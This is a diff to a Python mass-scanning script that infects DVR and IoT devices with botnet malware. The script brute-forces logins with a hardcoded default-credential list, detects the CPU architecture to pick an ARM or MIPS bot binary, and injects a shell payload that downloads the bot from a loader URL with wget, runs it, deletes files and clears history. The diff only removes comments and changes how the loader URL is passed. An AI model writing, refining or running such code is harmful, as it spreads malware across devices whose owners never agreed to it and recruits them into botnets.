@@ -4,8 +4,6 @@ import sys
 import time
 import base64
 import argparse
-import subprocess
-import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
 from datetime import datetime
@@ -55,7 +53,6 @@ logins = ["admin:686868", "admin:baogiaan", "admin:555555", "admin123:admin123",
           "administartor:password", "admin:p@ssword"]
 
 def detect_arch(session, target):
-    """Detecta a arquitetura do dispositivo via HTTP headers ou resposta"""
     try:
         url = f"http://{target}/"
         headers = {
@@ -64,14 +61,12 @@ def detect_arch(session, target):
         }
         response = session.get(url, headers=headers, timeout=(5, 10))
         
-        # Verificar headers que podem indicar a arch
         server = response.headers.get('Server', '').lower()
         if 'arm' in server:
             return 'bot_arm7'
         elif 'mips' in server:
             return 'bot_mips'
         
-        # Verificar conteúdo da página
         content = response.text.lower()
         if 'hi3520' in content or 'hi3521' in content:
             return 'bot_arm7'
@@ -83,12 +78,9 @@ def detect_arch(session, target):
         return None
 
 def get_payload_for_arch(arch):
-    """Retorna o payload correto baseado na arquitetura"""
     if not arch:
-        # Se não detectou, tenta todos (primeiro ARM que é mais comum)
         return f"cd /tmp || cd /run || cd /; for b in { ' '.join(LOADER_PATHS) }; do wget {LOADER_URL}$b -O $b; chmod 777 $b; ./$b &; done; rm -rf *; history -c"
     
-    # Mapeamento arch -> bot
     arch_map = {
         'armv7l': 'bot_arm7',
         'armv7': 'bot_arm7',
@@ -118,7 +110,6 @@ def get_payload_for_arch(arch):
     if bot:
         return f"cd /tmp || cd /run || cd /; wget {LOADER_URL}{bot} -O {bot}; chmod 777 {bot}; ./{bot} &; rm -rf {bot}; history -c"
     else:
-        # Fallback: tenta todos
         return f"cd /tmp || cd /run || cd /; for b in { ' '.join(LOADER_PATHS) }; do wget {LOADER_URL}$b -O $b; chmod 777 $b; ./$b &; done; rm -rf *; history -c"
 
 def create_session():
@@ -231,7 +222,7 @@ Server="time.nist.gov"/></Service></DVR>]]></SetConfiguration></DVR>'''
     except:
         return False
 
-def process_target(target):
+def process_target(target, loader_url):
     global status_attempted, status_found, status_logins, status_vuln, status_clean, status_failed
     
     session = create_session()
@@ -248,7 +239,6 @@ def process_target(target):
         with print_lock:
             status_found += 1
         
-        # Detectar arquitetura
         arch = detect_arch(session, target)
         if arch:
             with print_lock:
@@ -265,7 +255,10 @@ def process_target(target):
         if not valid_login:
             return
         
-        # Gerar payload baseado na arch detectada
+        # Usar loader_url passado como argumento
+        global LOADER_URL
+        LOADER_URL = loader_url
+        
         payload = get_payload_for_arch(arch)
         
         vuln_path = None
@@ -307,9 +300,6 @@ def main():
     
     args = parser.parse_args()
     
-    global LOADER_URL
-    LOADER_URL = args.loader_url
-    
     status_thread = threading.Thread(target=status_printer, daemon=True)
     status_thread.start()
     
@@ -332,7 +322,7 @@ def main():
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         futures = []
         for target in targets:
-            future = executor.submit(process_target, target)
+            future = executor.submit(process_target, target, args.loader_url)
             futures.append(future)
         
         try:
